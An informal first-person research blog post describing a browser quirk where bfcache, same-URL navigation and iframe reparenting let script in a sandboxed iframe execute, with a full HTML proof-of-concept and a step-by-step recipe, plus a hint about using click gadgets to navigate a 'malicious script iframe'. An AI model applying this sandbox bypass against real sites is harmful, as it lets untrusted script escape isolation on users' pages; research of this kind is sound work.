# Research Blog: A bfcache and iframe reparenting quirk to bypass sandboxed iframe with same-origin navigation.

Whomever reading this blog i want you to be familiar with the concept of **[bfcache](https://web.dev/articles/bfcache)**, **[sandboxed iframe](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe#sandbox)** and **[iframe reparenting](https://blog.huli.tw/2024/09/07/en/idek-ctf-2024-iframe/#2-iframe-reparenting-and-bfcache)**

Once you are familiar with the above concepts let's start by giving a minor detailing on the document definition of **Bfcache**
## Definition of Bfcache
this [document](https://web.dev/articles/bfcache#basics) says that, 
> With back/forward cache (bfcache), instead of destroying a page when the user ***navigates away***, we postpone destruction and pause JS execution. If the user navigates back soon, we make the page visible again and unpause JS execution. This results in a near instant page navigation for the user.

The term `navigates away` sound vague to me. So let me clear that.

Whenever an user navigates to a url that is different from the previous one.. the previous page is cached with bfcache. Same-origin or diffrent Origin.. doesnt matter. That also means that refresh a page again and again, it is not cached in bfcache. It does makes sense like... why would it be cached.!

Below is the script i used to test this quirk.
CHECK IT OUT...!

```html
<!DOCTYPE html>
<html>
<body>
  <h2>BFCache Test</h2>
  
  <div>
    <strong>History length:</strong> <span id="history-length"></span>
    <button onclick="history.back()">⬅️ Go Back</button>
  </div>

  <br>

  <iframe id="f" src="data:text/html,test1:<script>document.writeln('Frame 1 random: ' + Math.random())</script>"></iframe>
  <br><br>

  <button onclick="loadTest2()">Load test2</button>
  <button onclick="location.href='https://dssphkqz.requestrepo.com'">Top-level same origin navigation</button>
  <button onclick="location.href='https://example.com'">Top-level cross origin navigation</button>

  <script>
    console.log("Top-level script run");

    // Update history length display continuously
    const histSpan = document.getElementById('history-length');
    function updateHistoryLength() {
      histSpan.textContent = history.length;
      requestAnimationFrame(updateHistoryLength);
    }
    updateHistoryLength();

    // Observe when this top-level page is restored from BFCache
    window.addEventListener('pageshow', (event) => {
      console.log('✅ pageshow fired. Restored from BFCache:', event.persisted);
      document.body.style.background = event.persisted ? '#90EE90' : '#fff'; // light green if from cache
    });

    window.addEventListener('pagehide', (event) => {
      console.log('🚪 pagehide fired. persisted =', event.persisted);
    });

    // Chromium-specific Page Lifecycle API
    document.addEventListener('freeze', () => console.log('🧊 freeze fired'));
    document.addEventListener('resume', () => console.log('⏩ resume fired'));

    function loadTest2() {
      console.log('Loading test2...');
      const f = document.getElementById('f');
      f.setAttribute('sandbox', '');
      f.src = 'data:text/html,test2:<script>document.writeln(\'Frame 2 random: \' + Math.random())<\/script>';
    }
  </script>

  <hr>
  <div style="font-family: monospace;">
    <h3>🧪 Test 1 — Cross-origin Navigation BFCache</h3>
    <ol>
      <li>Press the <strong>Top-level cross origin navigation</strong> button.</li>
      <li>Then press the <strong>⬅️ Go Back</strong> button (or your browser’s back button).</li>
      <li>Observe whether the background turns green (indicating BFCache restore).</li>
    </ol>

    <h3>🧪 Test 2 — Same-origin Navigation BFCache</h3>
    <ol>
      <li>Press the <strong>Top-level same origin navigation</strong> button.</li>
      <li>Then press the <strong>⬅️ Go Back</strong> button (or your browser’s back button).</li>
      <li>Ah you will find urself..in the new page tab</li>
    </ol>
  </div>
</body>
</html>
```

you might be weirded out by testing the second case..but we want to increase the history length from 2 to 3 with the iframe navigation in order to again navigate to the same url and back.

This test proves that bfcache is only for ***different url navigation***. In the place of cross origin navigation button.. you can also put `https://dssphkqz.requestrepo.com/a`.. and observe that indeed the bfcache is working there.
## Magic Magic....
Now i will give you a magic recipe.. 

1. Load the script 
1. Press the loadTest2 button twice(more than once)
1. Do a same origin navigation
1. Press Go back

What do you observe.. test2 script inside sandboxed iframe is being executed.. WTF

According to [Huli's Blog](https://blog.huli.tw/2024/09/07/en/idek-ctf-2024-iframe/#2-iframe-reparenting-and-bfcache) we have to disable bfcache inorder to get this functionality.. Disabling bfcache may not be possible in a restrictive environment. If things such as Window.open, iframing the target or navigation to other url etc... are not available for you, you might be able to use any click gadget or anyway u seem fit to navigate the malicious script iframe. 

I still have no idea why the iframe navigation has to be done twice. iframe reparenting spec is not detailed anywhere. So to summarize.. 

We are neglecting the use of bfcache using the same url and iframe navigation to effectively bypass the sandbox. 

Interesting Quirk.. My first research blog.. hope u liked this.. TaDaaa x0x